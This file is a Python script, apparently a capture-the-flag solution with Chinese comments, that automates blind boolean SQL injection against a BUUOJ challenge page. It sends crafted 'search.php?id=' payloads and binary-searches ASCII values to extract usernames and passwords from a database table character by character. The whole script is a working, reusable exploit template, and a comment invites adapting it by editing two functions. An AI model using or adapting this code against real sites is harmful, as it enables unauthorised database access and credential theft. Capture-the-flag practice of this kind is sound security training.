import requests
import time
#修改bigger和sqlinj就好


#实现bigger才能使用
def findByDichotomy(begin,end):
	max_num=end
	while True:
		mid=int((begin+end)/2)
		if begin==max_num:
			return False
		if begin==end:
			return begin
		if end-begin==1:
			if bigger(begin):
				return end
			else:
				return begin
		if bigger(mid):
			begin=mid+1
		else:
			end=mid

#待求数据大于num
def bigger(num):
	return sqlinj(num)
def less(num):
	pass
def equal(num):
	pass

def sqlinj(num):
	

	burp0_url = "http://ff83c0e6-205f-4296-a512-fe2919cdeda4.node3.buuoj.cn:80/search.php?id=1/(((select(ord(substr(group_concat(username,',',password),POS,1)))from(F1naI1y))-GUESS)>0)".replace("GUESS",str(num)).replace("POS",str(pos))
	burp0_headers = {"Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://ff83c0e6-205f-4296-a512-fe2919cdeda4.node3.buuoj.cn/", "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7", "Connection": "close"}
	res=requests.get(burp0_url, headers=burp0_headers)
	time.sleep(0.5)
	print("test ",num)
	if "NO! Not this! Click others~~~" in res.text:
		return True
	else:
		return False


result="mygod,cl4y_is_really_amazing,welcome,welcome_to_my_blog,site,http://www.cl4y.top,site,http://www.cl4y.top,site"
pos=len(result)+1
while True:
	num=findByDichotomy(32,128)
	if num is False:
		print(result)
		break
	result+=chr(num)
	print(result)
	pos+=1